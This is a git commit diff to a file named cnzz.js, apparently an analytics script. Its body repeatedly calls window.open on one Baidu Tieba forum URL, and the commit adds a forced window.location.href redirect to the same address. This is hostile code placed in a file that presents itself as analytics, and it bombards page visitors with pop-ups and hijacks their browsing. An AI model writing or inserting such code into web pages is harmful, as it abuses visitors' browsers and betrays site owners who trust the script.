4f6d8cda4799499f1ee961302a7caba80e68f45a
i566 <58461724+i566@users.noreply.github.com>
2020-01-03 13:35:47 +0800

    Update cnzz.js

--- cnzz.js
+++ cnzz.js
@@ -4,6 +4,6 @@ window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5");
   window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); 
   window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); 
   window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); window.open("http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"); 
-  
+  window.location.href="http://tieba.baidu.com/f?kw=%BD%E4%C9%AB&fr=ala0&tpl=5"; 
 }
 
